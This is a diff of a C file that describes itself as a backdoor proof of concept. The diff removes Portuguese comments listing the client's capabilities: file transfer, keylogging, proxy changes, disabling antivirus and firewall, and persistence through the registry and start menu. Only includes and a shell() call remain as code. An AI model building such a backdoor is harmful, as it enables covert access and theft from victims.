@@ -17,57 +17,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
 */
 
-/* this is a free software > a classic backdoor write in pure C.
- some brazilian references about the assunt:
-
- Trojan Backdoor: inclui backdoors, possibilitando o acesso remoto do atacante ao computador.
-
- Trojan Destrutivo: altera/apaga arquivos e diretórios, formata o disco rígido e pode deixar o computador fora de operação.
-
-Screenlogger: similar ao keylogger, capaz de armazenar a posição do cursor e a tela apresentada no monitor, nos momentos em que o mouse é clicado,
- ou aregião que circunda a posição onde o mouse é clicado. É bastante utilizado por atacantes para capturar as teclas digitadas pelos usuários em teclados    virtuais,   disponíveis principalmente em sites de Internet Banking.
-
-Keylogger: capaz de capturar e armazenar as teclas digitadas pelo usuário no teclado do computador.
-Sua ativação, em muitos casos, é condicionada a uma ação prévia do usuário, como o acesso a um site específico de comércio eletrônico ou de Internet Banking
-
-
-Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.
-
-Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.
-
-JÁ PRONTOS: desativar anti-virus e firewallro
-            copiar-se para o registro
-            copiar-se para o menu iniciar
-
-terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
-
-// use without abuse.
-
-// POC!
-
-// coder  mrx6s0
-
-*/
-
-/*
-Esse é o lado "cliente". Programa qúe será instalado na máquina alvo, com o servidor na monitoria.
-
-Podendo mandar e receber arquivos, ativar keylogger, e mudar o proxy da máquina.
-
-JÁ PRONTOS: desativar anti-virus e firewallro
-            copiar-se para o registro
-            copiar-se para o menu iniciar
-
-terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
-
-// use without abuse.
-
-// POC!
-
-// coder  mrx6s0
-
-*/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <signal.h>
@@ -429,15 +378,15 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
 
          shell();
 
-         }
+                }
 
 
 
-       {
+           {
+
+
+        }
+
 
 
     }
-
-
-
-}
